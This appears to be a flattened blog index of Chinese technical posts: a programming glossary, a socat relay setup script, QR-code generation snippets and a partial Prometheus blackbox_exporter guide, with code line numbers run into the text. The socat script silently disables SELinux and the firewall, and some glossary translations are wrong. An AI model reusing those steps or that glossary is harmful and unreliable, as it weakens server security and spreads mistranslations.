散列表、哈希表header file 头文件heap 堆help file 帮助文件hierarchy 层次结构、继承体系hierarchical data 阶层式数据、层次式数据hook 钩子Host (application) 宿主(应用程序)hot key 热键hyperlink 超链接HTML (HyperTextMarkup Language)超文本标记语言HTTP pipeline HTTP管道HTTP (HyperTextTransfer Protocol) 超文本传输协议icon 图标IDE (IntegratedDevelopment Environment) 集成开发环境IDL (InterfaceDefinition Language) 接口定义语言identifier 标识符idle time 空闲时间if and only if 当且仅当IL (IntermediateLanguage) 中间语言、中介语言image 图象IME 输入法immediate base 直接基类immediate derived 直接派生类immediate updating 即时更新(for database)implicittransaction 隐式事务(for database)incremental update 增量更新(for database)index 索引(for database)implement 实现implementation 实现、实现品implicit 隐式import 导入increment operator 增加操作符infinite loop 无限循环infinite recursive 无限递归information 信息infrastructure 基础设施inheritance 继承、继承机制inline 内联inline expansion 内联展开initialization 初始化initializationlist 初始化列表、初始值列表initialize 初始化inner join 内联接(for database)in-place active 现场激活instance 实例instantiated 具现化、实体化(常应用于template)instantiation 具现体、具现化实体(常应用于template)integrate 集成、整合integrity 完整性、一致性integrityconstraint 完整性约束(for database)interprocesscommunication (IPC)进程间通讯(IPC)interacts 交互interface 接口for GUI 界面interoperability 互操作性、互操作能力interpreter 解释器introspection 自省invariants 不变性invoke 调用isolation level 隔离级别(for database)iterate 迭代iterative 反复的、迭代的iterator 迭代器iteration 迭代(回圈每次轮回称为一个iteration)item 项、条款、项目JIT compilationJIT 编译即时编译 5, 编程词汇 4123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475key 键(for database)key column 键列(for database)laser 激光late binding 迟绑定left outer join 左向外联接(for database)level 阶、层例high level 高阶、高层library 库lifetime 生命期、寿命link 连接、链接linkage 连接、链接linker 连接器、链接器literal constant 字面常数list 列表、表、链表list box 列表框livelock 活锁(for database)load 装载、加载load balancing 负载平衡loader 装载器、载入器local 局部的local object 局部对象lock 锁log 日志login 登录login securitymode 登录安全模式(for database)lookup table 查找表(for database)loop 循环loose coupling 松散耦合lvalue 左值machine code 机器码、机器代码macro 宏maintain 维护managed code 受控代码、托管代码Managed Extensions 受控扩充件、托管扩展managed object 受控对象、托管对象mangled name 受控名字manifest 清单manipulator 操纵器(iostream 预先定义的一种东西)many-to-manyrelationship 多对多关系(for database)many-to-onerelationship 多对一关系(for database)marshal 列集member 成员member accessoperator 成员取用运算子(有dot 和arrow 两种)member function 成员函数memberinitialization list 成员初始值列表memberwise 以member 为单元…、members逐一…memberwise copymemory 内存memory leak 内存泄漏menu 菜单message 消息message based 基于消息的message loop 消息环message queuing 消息队列metadata 元数据metaprogramming 元编程method 方法micro 微middleware 中间件middle tier 中间层modeling 建模modeling language 建模语言modifier 修饰字、修饰符modem 调制解调器module 模块most derived class 最底层的派生类mouse 鼠标mutable 可变的mutex 互斥元、互斥体multidimensionalOLAP (MOLAP) 多维OLAP(MOLAP) (for database)multithreadedserver application 多线程服务器应用程序multiuser 多用户multi-tasking 多任务multi-thread 多线程multicast delegate 组播委托、多点委托 6, 编程词汇 5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156named parameter 命名参数named pipe 命名管道namespace 名字空间、命名空间native 原生的、本地的native code 本地码、本机码Native ImageGenerator (NGEN)本地映像生成器nested class 嵌套类nested query 嵌套查询(for database)nested table 嵌套表(for database)network 网络network card 网卡nondependent nameobject 对象object based 基于对象的object file 目标文件object model 对象模型object oriented 面向对象的object pooling 对象池化ODBC data sourceODBC 数据源(for database)ODBC driver ODBC 驱动程序(for database)ODR(one-definition rule)OLE Automationobjects OLE 自动化对象(for database)OLE Automationserver OLE 自动化服务器(for database)OLE DB consumerOLE DB 使用者(for database)OLE DB for OLAP 用于OLAP 的OLE DB (for database)OLE DB providerOLE DB 提供者(for database)one-to-manyrelationship 一对多关系(for database)one-to-onerelationship 一对一关系(for database)online analyticalprocessing (OLAP) 联机分析处理(OLAP) (for database)online redo log 联机重做日志(for database)online transactionprocessing (OLTP) 联机事务处理(OLTP) (for database)Open Data Services(ODS) 开放式数据服务(ODS) (for database)Open DatabaseConnectivity (ODBC) 开放式数据库连接(ODBC) (for database)operand 操作数operating system(OS) 操作系统operation 操作operator 操作符、运算符option 选项optimizer 优化器outer join 外联接(for database)overflow 上限溢位(相对于underflow)overhead 额外开销overload 重载overloadresolution 重载决议overloadedfunction 重载的函数overloadedoperator 被重载的操作符override 覆写、重载、重新定义package 包packaging 打包palette 调色板parallel 并行parameter 参数、形式参数、形参parameter list 参数列表parameterize 参数化parent class 父类parentheses 圆括弧、圆括号parse 解析parser 解析器part 零件、部件partialspecialization 局部特化pass by address 传址(函式引数的传递方式)(非正式用语)pass by reference 传地址、按引用传递pass by value 按值传递pattern 模式PDA (personaldigital assistant) 个人数字助理PE (PortableExecutable) file 可移植可执行文件performance 性能persistence 持久性PInvoke (platforminvoke service) 平台调用服务pixel 像素placement delete 展示位置删除placement newplaceholder 占位符platform 平台POD (plain olddata (type))POI (point ofinstantiation)pointer 指针poll 轮询pooling 池化polymorphism 多态pop up 弹出式port 端口postfix 后缀precedence 优先序(通常用于运算子的优先执行次序)prefix 前缀preprocessor 预处理器primary key (PK) 主键(PK) (for database)primary table 主表(for database)primary template 原始模板primitive type 原始类型print 打印printer 打印机procedure 过程procedural 过程式的、过程化的process 进程profile 评测profiler 效能(性能)评测器program 程序programmer 程序员programming 编程、程序设计progress bar 进度指示器project 项目、工程property 属性protocol 协议pseudo code 伪码qualified 经过资格修饰(例如加上scope 运算子)qualified namequalifier 修饰符quality 质量queue 队列race condition 竞争条件（多线程环境常用语）radian 弧度radio button 单选按钮raise 引发(常用来表示发出一个exception)random number 随机数range 范围、区间rank 等级raw 未经处理的readOnly 只读record 记录(for database)recordset 记录集(for databaserecursive 递归re-direction 重定向refactoring 重构refer 引用、参考reference 引用、参考reference counting 引用计数referentialintegrity (RI)引用完整性(RI) (for database)register 寄存器reflection 反射refresh data 刷新数据(for database)regular expression 正则表达式relationaldatabase 关系数据库remote 远程remote request 远程请求represent 表述，表现resolve 解析、决议resolution 解析过程result set 结果集(for database)retrieve data 检索数据return 返回return type 返回类型return value 返回值right outer join 右向外联接(for database)revoke 撤销robust 健壮robustness 健壮性roll back 回滚(for database)roll forward 前滚(for database)routine 例程row 行(for database)row lock 行锁(for database)rowset 行集(for database)RPC (remoteprocedure call) RPC(远程过程调用)runtime 执行期、运行期、执行时、运行时rvalue 右值 7, 编程词汇 6123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154save 保存savepoint 保存点(for database)SAX (Simple APIfor XML)scalable 可伸缩的、可扩展的schedule 调度scheduler 调度程序schema 模式、纲目结构scroll bar 滚动条scope 作用域、生存空间scope operator 生存空间操作符scope resolutionoperator生存空间解析操作符screen 屏幕SDK (SoftwareDevelopment Kit) 软件开发包sealed class 密封类search 查找semantics 语义semaphore 信号量sequentialcontainer 序列式容器server 服务器、服务端serial 串行serialization/serialize 序列化server cursor 服务端游标、服务器游标(for database)session 会话(for database)setter 设值函数shared lock 共享锁(for database)sibling 同级side effect 副作用signature 签名single-threaded 单线程slider 滑块slot 槽smart pointer 智能指针SMTP (Simple MailTransfer Protocol) 简单邮件传输协议snapshot 截屏图snapshot 快照(for database)specialization 特化specification 规范、规格splitter 切分窗口SOAP (simpleobject access protocol) 简单对象访问协议software 软件source code 源码、源代码SQL (StructuredQuery Language) 结构化查询语言(for database)stack 栈、堆栈stack unwinding 叠辗转开解(此词用于exception 主题)standard library 标准库standard templatelibrary 标准模板库stateless 无状态的statement 语句、声明static cursor 静态游标(for database)static SQLstatements 静态SQL 语句(fordatabase)stored procedure 存储过程(for database)status bar 状态条stream 流string 字符串stub 存根subobject 子对象subquery 子查询(for database)subroutine 子例程subscript operator 下标操作符subset 子集subtype 子类型support 支持suspend 挂起symbol 记号syntax 语法system databases 系统数据库(for database)system tables 系统表(for database)table 表(for database)table lock 表锁(for database)table-levelconstraint 表级约束(for database)tape backup 磁带备份(for database)target 标的,目标task switch 工作切换TCP (TransportControl Protocol) 传输控制协议template 模板template-idtemplate argumentdeduction 模板参数推导template explicitspecialization 模板显式特化template parameter 模板参数template templateparametertemporary object 临时对象temporary table 临时表(for database)text 文本text file 文本文件thin client 瘦客户端third-party 第三方thread 线程thread-safe 线程安全的throw 抛出、引发(常指发出一个exception)token 符号、标记、令牌（看场合）trace 跟踪transaction 事务(for database)transaction log 事务日志(for database)transactionrollback 事务回滚(for database)transactionalreplication 事务复制(for database)translation unit 翻译单元traverse 遍历trigger 触发器(for database)two-phase commit 两阶段提交(for database)tuple 元组，字节组two-phase lookup 两阶段查找type 类型UDDI(UniversaryDescription, Discovery and Integration) 统一描述、查询与集成UML (unifiedmodeling language) 统一建模语言unary function 单参函数unary operator 一元操作符unboxing 拆箱、拆箱转换underflow 下限溢位(相对于overflow)Union query 联合查询(for database)UNIQUE constraintsUNIQUE 约束(for database)unique index 唯一索引(for database)unmanaged code 非受控代码、非托管代码unmarshal 散集unqualified 未经限定的、未经修饰的URI (UniformResource identifier)统一资源标识符URL (UniformResource Locator) 统一资源定位器user 用户user interface 用户界面value types 值类型variable 变量vector 向量(一种容器，有点类似array)viable 可行的video 视频view 视图VEE (VirtualExecution Engine) 虚拟执行引擎vendor 厂商view 视图(for database)virtual function 虚函数virtual machine 虚拟机virtual memory 虚拟内存vowel 元音字母Web Services web 服务WHERE clause WHERE 子句(for database)wildcardcharacters 通配符字符(for database)wildcard search 通配符搜索(for database)window 窗口window function 窗口函数window procedure 窗口过程Windowsauthentication Windows 身份验证wizard 向导word 单词word processor 字处理器wrapper 包装、包装器write enable 写启用(for database)write-ahead log 预写日志(for database)write-only 只写WSDL (Web ServiceDescription Language) Web Service 描述语言XML MessageInterface (XMI) XML 消息接口XML (eXtensibleMarkup Language) 可扩展标记语言XSD (XML SchemaDefinition) XML 模式定义语言XSL (eXtensibleStylesheet Language) 可扩展样式表语言XSLT (eXtensibleStylesheet Language Transformation)可扩展样式表语言转换xxx based 基于xxx 的xxx oriented 面向xxx 3, 开发环境软件工具常用英语词汇1, 单词123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103item 项目，一条，一则，一件商品File 文件Edit 编辑Editor 编辑， 主编View 视图 看法， 观看Navigate 导航Code 代码 ；密码，电码，编码Refactor 重构Run 运行 跑，奔跑Tools 工具，工具包，手段，方法VCS 版本控制系统，版本控制Window 窗口，窗，视窗Help 帮助 协助 援助Cancel 取消，撤销just Restart 重新开始Invalidate 使无效，使作废New Project 新建项目，创建新的工程New Scratch File 新建临时文件EditorConfig File 编辑配置文件Property Sets 属性集EditorConfig stardard 编辑配置标准PyCharm-specific PyCharm专用Add properties for 添加新属性EditorConfig 编辑配置Open 打开 开放的，Save As... 另存为...Open Recent 最近打开的， 最近打开的文件Close Project 关闭项目， 关闭工程Rename Project 重命名项目，重命名工程Settings... 设置Other SEttings 其他设置Import Settings 导入设置Export Settings 导出设置Settings Repository 设置存储库,设置存储地址，设置新的存储地址，Upstream URL 选择存储路径Merge 合并，并入，结合Overwrite Local 覆盖本地文件Overwrite Remote 覆盖远程Save All 全部保存， 保存所有文件Export to HTML 导出为html文件Print 打印， 输出Add to Favorites 添加到收藏夹File Encoding 文件编码 文件字符集Remove Bom 删除物料清单Line Separators 换行分隔符，有windos \\r\\n,nuix \\n max os\\rMake File Read-Only 使文件为只读Power Save Mode 省电模式Exit 退出Version Control 版本控制，版本管理Project Interpreter 项目翻译，项目解释器Code Style 代码样式，代码风格Inspections 检测，安全检测File Encodings 文件编码，Inlay Hints 镶嵌暗示Spelling 拼写，拼法Auto Import 自动导入Auto 自动 自动接听，自动驾驶Undo Backspace 撤销Redo 重做，恢复，Cut 剪切，切割Copy 复制，Copy Reference 复制引用Copy Path 复制路径Paste 粘贴Paste from History 从历史粘贴Delete 删除Find 查找Select All 全选Extend Selection 扩展选定的内容Shrink Selection 缩小选择Join Lines 连接行，合并行Fill Paragraph 填充段落。两端对齐Duplicate Line 重复行Sort Lines 排序行Reverse Lines 倒排序行Toggle Case 切换大小写转换Convert Indents 转换缩进Next Parameter 下一个参数Previous Parameter 上一个参数Macors 宏，抽象，替换一定的文本模式Generate 生成，产生Inspection code 检查代码Debug 调试，排错Attach to Process 附加到进程Tasks 任务，工作Contexts 上下文Find Action 查找操作Getting sTarted 新手入门About 关于length 长度location 位置frames 框架replace 替代，更新alert 警报，警觉，警惕Element 元素，last 最后的child 小孩left 左边right 右边sibling 兄弟姐妹placeholder 占位符 2, 短语，语句1234567891011121314151617181920212223242526272829303132How EditorConfig works? 编辑配置是如何工作的?Reload All from Disk 全部从磁盘重新加载 从新刷新Invalidate Caches /Restart 使缓存失效/重新启动Associate with File Type 与文件类型关联，如 Text文本，xhtml、xml、yaml等Settings for New Projects 新项目的设置Run Configuration Templates for New Projects 为新项目运行配置模板Appearance &amp; Behavior 外观与行为、性能Build,Execution, Deployment 构建、执行、 部署Shcemas and DTDsFile and Code Templates 文件和代码模板Paste without Formatting 无格式化粘贴Column Selection Mode 列选择模式Complete Current Statement 完成当前报表Unindent LIne or Selection 未缩进行或选定内容Keymap Reference 键映射引用Demos and Screencasts 演示和截屏Tip of the Day 最新消息Productivity Guide 操作指南，生产力指南Activity Monitor 活动监视器，活动管理器Analyze Plugin Startup Performance 分析插件启动性能Dump Threads 转存线程Contact Support 联系技术支持Submit a Bug Report 提交错误报告Submit Feedback 提交反馈Show Log in Explorer 在资源管理器中显示日志Collect Trobleshooting Information 收集Trobleshooting信息Compress Logs and Show in Explorer 压缩日志并在资源管理器中显示Change Memory Settings 更改内存设置Edit Custom Properties 编辑自定义属性Edit Custom VM Options 编辑自定义虚拟机选项Debug Log Settings 调试日志设置Check for Updates 检查更新 4, 120个常用单词1234567apple 苹果banana 香蕉chicken 鸡肉egg 鸡蛋bus 巴士 公交车taxi 出租车subway 地铁 25 个常见的名词 12345678910111213141516171819202122232425time 时间person 人物 人year 年份 年way 方法 手段 方式 作风day 日子 一天 thing 东西 物 物件 物品。man 男人world 世界life 生命hand 手part 部分 片段 一点 成员，成分child 小孩 儿童 子女eye 眼睛 视力woman 女人 女子place 地点 位置 地方work 工作week 星期 周family 家庭company 公司school 学校 上学country 国家number 数字group 团体 组 群problem 问题 fact 事实 现实，实际情况。 25个最常见的动词 12345678910111213141516171819202122232425be 成为 有 存在 位于have 有；持有 占有do 去做 做。干(某事) 行动。say 说 讲。背诵。表达get 得到 收到， 获得make 制造 做，组装go 去 走 know 知道 了解 认识到。take 拿 拿走 取走see 看见 见到 看出come 过来 来 think 思考 认为 以为 look 瞧瞧看 看 寻找want 要去 要，想要，希望give 给 赠与 送给use 使用 利用，运用find 寻找 tell 告诉 告知 ask 询问work 操作 工作seem 仿佛 好像feel 感觉 try 尝试 试图；设法leave 离开(某人或某处) 遗弃 丢弃call 叫 给...命名 把...看作 25个形容词 12345678910111213141516171819202122232425good 好的 优质的new 新的first 最初的last 最后的long 长的great 伟大的 巨大的little 娇小的 小的。比较小的。own 自己的 拥有other 其他的old 老的right 正确的 正当 big 大的high 高的different 不同的small 小的large 大规模的next 次于的 下一个，接下来的early 早期的young 年幼的 年轻的，未成熟的important 重要的few 很少的public 公共的 公众的bad 坏的 不合格的，质量差的same 相同的 一模一样的able 有能力的 必须知道的25个单词 12345678910111213141516171819202122232425the 这个and 和 与 同 然后 接着a 一个that 那个(指较远的人或事物)I 我it 它not 不he 他as 作为 像；如同 当作you 你 你们this 这 这个 这样but 但是 尽管如此his 它的they 他们 她们her 她的she 她or 或者 或an 一个will 将会my 我的one 一all 全部 所有would 将要there 那里their 他们的 17个介词 1234567891011121314151617to 到 向 往 朝 对着(某方向或某处)of 关于 属于(某人，某物)in 在里面 在...内， 在...中；进入for 为了，关于 for all 尽管，虽然on 在上 在...上with 和 和...在一起；跟 同 借at 在(某处)，在(某时间或时刻)by 经过 靠近 通过from 从 从...起 从...开始。up 向上的 在上面about 关于 对于into 进入 到...里面 朝over 结束after 在以后 后来 在...后beneath 在下方 在底下under 在下面 above 超过","link":"/2020/08/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B8%B8%E7%94%A8%E5%8D%95%E8%AF%8D/"},{"title":"配置中转服务器","text":"配置中转服务器配置端口转发，适用于国外访问国内延迟比较高，香港地区访问国内延迟低，使用香港服务器做中转，转发到国内。同时香港服务器接收海外数据，比如新加坡。 直接运行脚本,按照提示配置香港服务器端口和远程服务器ip和端口， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177#! /bin/bashPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/binexport PATH# ====================================================# System Request:CentOS 6+ 、Debian 7+、Ubuntu 14+# Author: Rat's# Dscription: Socat一键脚本# Version: 1.0# Blog: https://www.moerats.com# Github:https://github.com/iiiiiii1/Socat# ====================================================Green=\"\\033[32m\"Font=\"\\033[0m\"Blue=\"\\033[33m\"rootness(){ if [[ $EUID -ne 0 ]]; then echo \"Error:This script must be run as root!\" 1&gt;&amp;2 exit 1 fi}checkos(){ if [[ -f /etc/redhat-release ]];then OS=CentOS elif cat /etc/issue | grep -q -E -i \"debian\";then OS=Debian elif cat /etc/issue | grep -q -E -i \"ubuntu\";then OS=Ubuntu elif cat /etc/issue | grep -q -E -i \"centos|red hat|redhat\";then OS=CentOS elif cat /proc/version | grep -q -E -i \"debian\";then OS=Debian elif cat /proc/version | grep -q -E -i \"ubuntu\";then OS=Ubuntu elif cat /proc/version | grep -q -E -i \"centos|red hat|redhat\";then OS=CentOS else echo \"Not supported OS, Please reinstall OS and try again.\" exit 1 fi}disable_selinux(){ if [ -s /etc/selinux/config ] &amp;&amp; grep 'SELINUX=enforcing' /etc/selinux/config; then sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config setenforce 0 fi}disable_iptables(){ systemctl stop firewalld.service &gt;/dev/null 2&gt;&amp;1 systemctl disable firewalld.service &gt;/dev/null 2&gt;&amp;1 service iptables stop &gt;/dev/null 2&gt;&amp;1 chkconfig iptables off &gt;/dev/null 2&gt;&amp;1}get_ip(){ ip=`curl http://whatismyip.akamai.com`}config_socat(){ echo -e \"${Green}请输入Socat配置信息！${Font}\" read -p \"请输入本地端口:\" port1 read -p \"请输入远程端口:\" port2 read -p \"请输入远程IP:\" socatip}start_socat(){ echo -e \"${Green}正在配置Socat...${Font}\" nohup socat TCP4-LISTEN:${port1},reuseaddr,fork TCP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat -T 600 UDP4-LISTEN:${port1},reuseaddr,fork UDP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; if [ \"${OS}\" == 'CentOS' ];then sed -i '/exit/d' /etc/rc.d/rc.local echo \"nohup socat TCP4-LISTEN:${port1},reuseaddr,fork TCP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat -T 600 UDP4-LISTEN:${port1},reuseaddr,fork UDP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; \" &gt;&gt; /etc/rc.d/rc.local chmod +x /etc/rc.d/rc.local elif [ -s /etc/rc.local ]; then sed -i '/exit/d' /etc/rc.local echo \"nohup socat TCP4-LISTEN:${port1},reuseaddr,fork TCP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat -T 600 UDP4-LISTEN:${port1},reuseaddr,fork UDP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; \" &gt;&gt; /etc/rc.local chmod +x /etc/rc.local elseecho -e \"${Green}检测到系统无rc.local自启，正在为其配置... ${Font} \"echo \"[Unit]Description=/etc/rc.localConditionPathExists=/etc/rc.local [Service]Type=forkingExecStart=/etc/rc.local startTimeoutSec=0StandardOutput=ttyRemainAfterExit=yesSysVStartPriority=99 [Install]WantedBy=multi-user.target\" &gt; /etc/systemd/system/rc-local.serviceif [ ! -f /etc/rc.local ]; thenecho \"#!/bin/sh -e## rc.local## This script is executed at the end of each multiuser runlevel.# Make sure that the script will \"exit 0\" on success or any other# value on error.## In order to enable or disable this script just change the execution# bits.## By default this script does nothing.\" &gt; /etc/rc.localecho \"nohup socat TCP4-LISTEN:${port1},reuseaddr,fork TCP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp;nohup socat -T 600 UDP4-LISTEN:${port1},reuseaddr,fork UDP4:${socatip}:${port2} &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp;\" &gt;&gt; /etc/rc.localchmod +x /etc/rc.localsystemctl enable rc-local &gt;/dev/null 2&gt;&amp;1systemctl start rc-local &gt;/dev/null 2&gt;&amp;1 fi get_ip sleep 3 echo echo -e \"${Green}Socat安装并配置成功!${Font}\" echo -e \"${Blue}你的本地端口为:${port1}${Font}\" echo -e \"${Blue}你的远程端口为:${port2}${Font}\" echo -e \"${Blue}你的本地服务器IP为:${ip}${Font}\" exit 0}install_socat(){ echo -e \"${Green}即将安装Socat...${Font}\" if [ \"${OS}\" == 'CentOS' ];then yum install -y socat else apt-get -y update apt-get install -y socat fi if [ -s /usr/bin/socat ]; then echo -e \"${Green}Socat安装完成！${Font}\" fi}status_socat(){ if [ -s /usr/bin/socat ]; then echo -e \"${Green}检测到Socat已存在，并跳过安装步骤！${Font}\" main_x else main_y fi}main_x(){checkosrootnessdisable_selinuxdisable_iptablesconfig_socatstart_socat}main_y(){checkosrootnessdisable_selinuxdisable_iptablesinstall_socatconfig_socatstart_socat}status_socat 2. 删除配置好的转发端口上面运行的脚本是把配置的端口转发写入的开机自启动配置里面的，所以删掉对应的就行。 12345678vim /etc/rc.localecho 1 &gt; /proc/sys/net/ipv4/ip_forward)&amp;nohup socat TCP4-LISTEN:999,reuseaddr,fork TCP4:47.116.139.66:33189 &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat -T 600 UDP4-LISTEN:999,reuseaddr,fork UDP4:47.116.139.66:33189 &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat TCP4-LISTEN:8080,reuseaddr,fork TCP4:47.116.139.66:33189 &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp; nohup socat -T 600 UDP4-LISTEN:8080,reuseaddr,fork UDP4:47.116.139.66:33189 &gt;&gt; /root/socat.log 2&gt;&amp;1 &amp;","link":"/2022/04/17/%E9%85%8D%E7%BD%AE%E4%B8%AD%E8%BD%AC%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"master部署文档","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2023/11/01/%E9%83%A8%E7%BD%B2%E6%96%87%E6%A1%A3/"},{"title":"获取当前域名并生成二维码","text":"1.获取当前域名并生成二维码提供下载1这是全代码 ，如果要获取url的话直接修改window.location.host 把host改为url，或者href 123456789101112131415161718192021222324&lt;!DOCTYPE html&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;title&gt;js_canvas_download&lt;/title&gt; &lt;script type='text/javascript' src='http://cdn.staticfile.org/jquery/3.4.1/jquery.min.js'&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id=&quot;qrcode&quot;&gt;&lt;/div&gt;&lt;a id=&quot;download&quot; download=&quot;qrcode.jpg&quot;&gt;&lt;/a&gt;&lt;button id=&quot;save&quot;&gt;save&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt; jQuery('#qrcode').qrcode({ width: 100, height: 100, text: window.location.host }); $(&quot;#save&quot;).click(function () { var canvas = $('#qrcode').find(&quot;canvas&quot;).get(0); var url = canvas.toDataURL('image/jpeg'); $(&quot;#download&quot;).attr('href', url).get(0).click(); return false; });&lt;/script&gt; 2,如果要关闭下载二维码的话就直接注释掉 id=save 2.1，如果想要生成的二维码居中的话，就可以定义下qrcode,在&lt;head&gt; 和&lt;/head&gt;之间 12345678910111213141516171819&lt;style&gt; #qrcode{ display: flex; justify-content: center; margin: 0 auto; } .dd{ display: flex; justify-content: center; margin: 5px auto; } &lt;/style&gt; # .dd是定义的文字居中， &lt;div class=&quot;dd&quot;&gt; &lt;/dt&gt; &lt;dd &gt;手机扫码下载&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; 3, 如果此网页正在试图从未经验证的来源加载脚本 就把连接添加https，还可以通过F12来查看是什么代码导致了这种情况 会发现是http://pet.zoosnet.pet是这条有问题，把注释掉就可以了，或者添加安全连接， 2， 获取固定域名的二维码 首先需要用到一个qrcode.js 库 git clone https://github.com/davidshimjs/qrcodejs.git 以下是示列： 123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt; 练习 &lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;html/js/qrcodejs/qrcode.min.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript' src='https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js'&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id=&quot;qrcode&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var qrcode = new QRCode(document.getElementById(&quot;qrcode&quot;), { text: &quot;https://wohenliu.com&quot;, width: 128, height: 128, colorDark : &quot;#000000&quot;, colorLight : &quot;#ffffff&quot;, correctLevel : QRCode.CorrectLevel.H});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 然后就自动生成二维码了","link":"/2020/08/05/%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%9F%9F%E5%90%8D%E5%B9%B6%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81/"},{"title":"Prometheus的黑盒监控ssl证书监控","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus server2.com 192.168.224.12 Centos7.6 blackbox_exporter版本0.23.0 1、环境搭建 docker安装略 docker-compose安装略 二、黑盒监控1、白盒监控和黑盒监控“白盒监控”–需要把对应的Exporter程序安装到被监控的目标主机上，从而实现对主机各种资源及其状态的数据采集工作。 但是由于某些情况下操作技术或其他原因，不是所有的Exporter都能部署到被监控的主机环境中，最典型的例子是监控全国网络质量的稳定性，通常的方法是使用ping操作，对选取的节点进行ICMP测试，此时不可能在他人应用环境中部署相关的Exporter程序。针对这样的应用的场景，Prometheus社区提供了黑盒解决方案，Blackbox Exporter无须安装在被监控的目标环境中，用户只需要将其安装在与Prometheus和被监控目标互通的环境中，通过HTTP、HTTPS、DNS、TCP、ICMP等方式对网络进行探测监控，还可以探测SSL证书过期时间。 blackbox_exporter Prometheus 官方提供的 exporter 之一，可以提供 http、dns、tcp、icmp 的监控数据采集 2、二进制安装（二选一）https://prometheus.io/download/ 12345678wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.23.0/blackbox_exporter-0.23.0.linux-amd64.tar.gztar zxvf blackbox_exporter-0.23.0.linux-amd64.tar.gz mkdir /usr/local/Prometheus -pmv blackbox_exporter-0.23.0.linux-amd64 /usr/local/Prometheus/blackbox_exporter 创建用户1useradd -M -s /usr/sbin/nologin prometheus 更改exporter文件夹权限1chown prometheus:prometheus -R /usr/local/Prometheus 创建systemd1234567891011121314151617cat &lt;&lt;&quot;EOF&quot; &gt;/etc/systemd/system/blackbox_exporter.service[Unit]Description=blackbox_exporterAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/Prometheus/blackbox_exporter/blackbox_exporter \\ --config.file &quot;/usr/local/Prometheus/blackbox_exporter/blackbox.yml&quot; \\ --web.listen-address &quot;:9115&quot;Restart=on-failure[Install]WantedBy=multi-user.targetEOF 启动123systemctl daemon-reloadsystemctl start blackbox_exporter 加入到开机自启动1systemctl enable blackbox_exporter 检查1systemctl status blackbox_exporter 启动不了检查日志 1journalctl -u blackbox_exporter -f 2、docker安装（二选一）创建配置文件12345678910111213141516171819202122232425262728293031323334353637383940mkdir /data/blackbox_exporter/cat &gt;/data/blackbox_exporter/config.yml&lt;&lt;&quot;EOF&quot;modules: http_2xx: prober: http http_post_2xx: prober: http http: method: POST tcp_connect: prober: tcp pop3s_banner: prober: tcp tcp: query_response: - expect: &quot;^+OK&quot; tls: true tls_config: insecure_skip_verify: false ssh_banner: prober: tcp tcp: query_response: - expect: &quot;^SSH-2.0-&quot; - send: &quot;SSH-2.0-blackbox-ssh-check&quot; irc_banner: prober: tcp tcp: query_response: - send: &quot;NICK prober&quot; - send: &quot;USER prober prober prober :prober&quot; - expect: &quot;PING :([^ ]+)&quot; send: &quot;PONG ${1}&quot; - expect: &quot;^:[^ ]+ 001&quot; icmp: prober: icmp icmp_ttl5: prober: icmpEOF cf代理状态妈非200官网案例 123456http_2xx: prober: http timeout: 5s http: method: GET preferred_ip_protocol: &quot;ip4&quot; 注意：使用preferred_ip_protocol: 